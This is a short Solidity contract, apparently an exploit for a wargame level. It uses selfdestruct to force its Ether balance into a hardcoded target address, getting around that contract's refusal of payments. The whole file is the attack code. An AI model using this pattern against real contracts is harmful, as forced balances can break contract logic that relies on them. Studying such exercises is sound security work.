// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address payable public owner;
    address payable public attack;
    uint256 public creationAmount;

    // Event to log the self-destruction of the contract
    event ContractDestroyed(string message, address destroyedBy, uint256 amountTransferred);

    // Payable constructor
    constructor() payable {
        require(msg.value > 0, "You must send some Ether to deploy this contract.");
        owner = payable(msg.sender);
        attack = payable(0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D);
        creationAmount = msg.value;
    }

    // Modifier to restrict function access only to the contract owner
    modifier onlyOwner() {
        require(msg.sender == owner, "You are not the contract owner.");
        _;
    }

    // Function to self-destruct the contract, only accessible by the owner
    function destroy() external onlyOwner {
        uint256 balance = address(this).balance;
        emit ContractDestroyed("Contract has been destroyed.", msg.sender, balance);
        selfdestruct(attack);
    }

    // Function to withdraw funds from the contract, only accessible by the owner
    function withdraw(uint256 amount) external onlyOwner {
        require(amount > 0 && amount <= address(this).balance, "Invalid withdrawal amount.");
        owner.transfer(amount);
    }

    // Function to get the contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
